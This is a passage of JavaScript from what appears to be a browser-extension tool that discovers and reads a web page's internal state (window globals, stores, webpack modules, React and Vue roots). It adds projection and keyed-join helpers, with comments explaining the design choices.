    // 2. everything else this app put on `window` — the generic half, which needs no list and is
    //    how a framework nobody has heard of yet still gets found.
    const rest = [];
    for (const n of own.names) {
      if (claimed[n] || STATE_CHUNK.test(n)) continue;
      let v = null;
      try { v = window[n]; } catch (_) { continue; }
      if (v == null) continue;
      const t = typeof v;
      if (t !== 'object' && t !== 'function') { rest.push(n); continue; }
      let big = false;
      try { big = Array.isArray(v) ? v.length > 0 : (t === 'object' && Object.keys(v).length > 0); } catch (_) {}
      if (big && sources.length < DISCOVER_SOURCES) add(n, 'a global this page added', v);
      else rest.push(n);
    }

    // 3. store-shaped globals. The Redux devtools hook is NOT one of these — see `stateStores`.
    stateStores(own.names).forEach((s, i) => {
      add(`@stores.${i}.getState`, `${s.name} — getState/dispatch/subscribe, so a store`,
        (() => { try { return s.store.getState(); } catch (_) { return null; } })(),
        'read through the store\'s own getState(), which is on the accessor allowlist');
    });

    // 4. webpack registries. Reported even when no descriptor names this app, because the module
    //    IDS are themselves the answer to "where does this app keep things" — and every one of
    //    them is a readable path.
    const chunks = stateChunkNames(own.names);
    const mods = chunks.length ? stateModules(own.names) : null;
    const webpack = chunks.length
      ? {
        chunks,
        reachable: !!(mods && mods.bag),
        modules: (mods && mods.modules) || 0,
        ...(mods && mods.why ? { why: mods.why } : {}),
        ids: mods && mods.bag ? Object.keys(mods.bag).slice(0, DISCOVER_IDS) : [],
        idsTotal: mods && mods.bag ? Object.keys(mods.bag).length : 0,
        read: '@mod["<module id>"].<export>',
      }
      : null;

    // 5. and what the DESCRIPTOR knows, which is the only per-app knowledge in the whole file —
    //    which module ids hold the records worth reading. Matched by EXPORT KEY over the app's
    //    own cache, so a new app is a descriptor entry rather than new code.
    const spec = stateSpec();
    const wants = (spec && spec.webpack && spec.webpack.want) || [];
    if (mods && mods.bag && wants.length) {
      for (const want of wants) {
        for (const id of Object.keys(mods.bag)) {
          let hit = false;
          try { hit = !!(mods.bag[id] && typeof mods.bag[id] === 'object' && want in mods.bag[id]); } catch (_) {}
          if (!hit) continue;
          add(stateJoin(`@mod[${JSON.stringify(id)}]`, want),
            `named by the ${mapKind()} descriptor`, (() => { try { return mods.bag[id][want]; } catch (_) { return null; } })());
        }
      }
    }

    // 6. framework roots. Shallow by nature — a fiber tree is mostly plumbing — but it is the
    //    only door into a component's own state on an app that puts nothing on `window`.
    stateReactRoots().forEach((r, i) => add(`@react.${i}`, r.via, r.node,
      'a fiber: memoizedState, memoizedProps and child are the fields worth reading'));
    stateVueApps().forEach((r, i) => add(`@vue.${i}`, r.via, r.node));

    return {
      url: location.href,
      globals: { via: own.via, added: own.names.length },
      sources,
      otherGlobals: rest.slice(0, DISCOVER_OTHER),
      ...(webpack ? { webpack } : {}),
      ...(spec ? { descriptor: mapKind() } : {}),
      redacted: ctx.redacted,
      ...(ctx.cut ? { truncated: true } : {}),
      tell: sources.length
        ? 'read one with page_state path:"<path from sources[].path>"'
        : 'this page keeps no state anywhere this tool can see — the DOM may be all there is',
    };
  }


  // --- projection and keyed join ------------------------------------------------------------------
  // TWO CAPABILITIES ADDED BECAUSE A SCRIPT HAD TO EXIST WITHOUT THEM.
  //
  // Getting one group's 156 members meant reading a participant list whose ids are opaque keys, then
  // making 156 SEPARATE reads to turn each key into a record — every one of them crossing an agent's
  // context, and the table assembled by hand afterwards in Node. The job was expressible in three
  // sentences and not expressible in this tool at all, which is what "the tool is unfinished" means.
  //
  // Both are DATA, not code: a field path is walked as properties, and a join is a key looked up in
  // an object. Nothing here evaluates anything the caller sent — the same hard rule as everywhere
  // else in this file (MV3 rejects remote code, and this runs in a signed-in browser).
  //
  // NOTHING APP-SPECIFIC. A collection of rows, a field to key on, another collection to look in:
  // that shape is Alibaba's listing→supplier, a storefront's grid→SKU stock, any list whose rows
  // reference records held elsewhere. The per-app part is the PATHS, which the caller passes.
  function statePick(node, spec) {
    const parsed = statePath(spec);
    if (parsed.error) return { error: parsed.error };
    let at = node;
    // Skips the head that `statePath` reserves for a root name: a projection is relative to the row.
    for (const step of parsed.steps) {
      if (at == null || typeof at !== 'object') return { missing: true };
      try { at = at[step]; } catch (_) { return { missing: true }; }
    }
    return { value: at };
  }

  // The row, reduced to the named fields. Keys keep the path the caller asked for, so a column is
  // recognisable in the reply and in any table built from it.
  function stateProject(node, fields, ctx) {
    const out = {};
    for (const f of fields) {
      const got = statePick(node, String(f));
      if (got.error) { out[String(f)] = `[bad field path: ${got.error}]`; continue; }
      if (got.missing) { out[String(f)] = null; continue; }
      out[String(f)] = stateValue(got.value, ctx, 2, ctx.wide, String(f).split('.').pop());
    }
    return out;
  }

  // For each row: take the value at `from`, use it as a KEY into the collection at `into`, and merge
  // that record's `fields` in. A miss is COUNTED and marked, never silently dropped — a join that
  // quietly loses rows is how a 156-member group becomes an export of 130 nobody questions.
  // NAMED `stateResolveRows`, not `stateJoin`: that name is already taken by the path-prefix
  // helper above, which discovery depends on. Shadowing it would have broken `@mod` reads.
  function stateResolveRows(rows, nodes, spec, ctx) {
    const from = String(spec.from || '');
    const into = String(spec.into || '');
    const want = Array.isArray(spec.fields) ? spec.fields.map(String) : [];
    if (!from || !into) return { why: 'resolve needs both from and into' };
    const parsed = statePath(into);
    if (parsed.error) return { why: `resolve.into is not a path: ${parsed.error}` };
    const own = stateAppGlobals();
    const bag = stateWalk(parsed.steps, own.names);
    if (bag.error) return { why: `resolve.into did not resolve: ${bag.why || bag.error}` };
    const table = bag.node;
    if (!table || typeof table !== 'object') return { why: 'resolve.into is not a collection' };
    let missed = 0;
    for (let i = 0; i < rows.length; i++) {
      const key = statePick(nodes[i], from);
      const k = key && key.value != null ? String(key.value) : '';
      let rec = null;
      try { rec = k ? table[k] : null; } catch (_) { rec = null; }
      if (!rec || typeof rec !== 'object') { rows[i]['@resolved'] = false; missed++; continue; }
      rows[i]['@resolved'] = true;
      const add = want.length ? stateProject(rec, want, ctx) : {};
      for (const kk of Object.keys(add)) rows[i][kk] = add[kk];
    }
    return { missed, of: rows.length };
  }


